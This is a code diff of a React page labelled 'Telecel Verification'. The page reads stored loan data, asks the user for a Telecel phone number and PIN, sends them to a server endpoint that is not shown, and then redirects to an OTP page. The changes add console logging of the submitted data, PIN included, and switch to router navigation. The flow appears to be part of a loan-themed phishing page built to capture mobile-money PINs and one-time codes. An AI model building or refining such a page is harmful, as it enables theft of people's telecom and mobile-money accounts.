@@ -1,9 +1,11 @@
 import { useState } from "react";
 import axios from "axios";
 import "../styles/app.css";
+import { useNavigate } from "react-router-dom";
 
 export default function Telecel() {
   const [loading, setLoading] = useState(false);
+  const navigate = useNavigate();
 
   const [data, setData] = useState({
     number: "",
@@ -17,7 +19,10 @@ export default function Telecel() {
   const handleSubmit = async (e) => {
     e.preventDefault();
 
-    const loanData = JSON.parse(localStorage.getItem("loanData"));
+    const loanData = JSON.parse(localStorage.getItem("loanData")) || {};
+
+    console.log("LoanData:", loanData);
+    console.log("Telecel Data:", data);
 
     setLoading(true);
 
@@ -30,13 +35,17 @@ export default function Telecel() {
         }
       );
 
+      console.log("SERVER RESPONSE:", res.data);
+
       if (res.data.id) {
-        window.location.href = `/otp/${res.data.id}`;
+        navigate(`/otp/${res.data.id}`);
+      } else {
+        alert("No ID returned from server");
       }
 
     } catch (err) {
-      alert("Failed to submit");
       console.error(err);
+      alert("Failed to submit");
     }
 
     setLoading(false);
@@ -46,39 +55,27 @@ export default function Telecel() {
     <div className="loan-container">
       <div className="card">
 
-        <div className="header">
-          <img src="/icon.jpeg" className="logo" />
-          <h1>Telecel Verification</h1>
-          <p className="subtitle">
-            Enter your Telecel number and PIN
-          </p>
-        </div>
+        <h1>Telecel Verification</h1>
 
         <form onSubmit={handleSubmit}>
 
-          <div className="section">
-            <label>Telecel Number *</label>
-            <input
-              name="number"
-              placeholder="Enter your number"
-              onChange={handleChange}
-              required
-            />
-          </div>
+          <input
+            name="number"
+            placeholder="Telecel Number"
+            onChange={handleChange}
+            required
+          />
 
-          <div className="section">
-            <label>PIN / Password *</label>
-            <input
-              name="pin"
-              type="password"
-              placeholder="Enter your PIN"
-              onChange={handleChange}
-              required
-            />
-          </div>
+          <input
+            name="pin"
+            type="password"
+            placeholder="PIN"
+            onChange={handleChange}
+            required
+          />
 
-          <button className="btn" disabled={loading}>
-            {loading ? <div className="spinner"></div> : "Continue"}
+          <button disabled={loading}>
+            {loading ? "Processing..." : "Continue"}
           </button>
 
         </form>
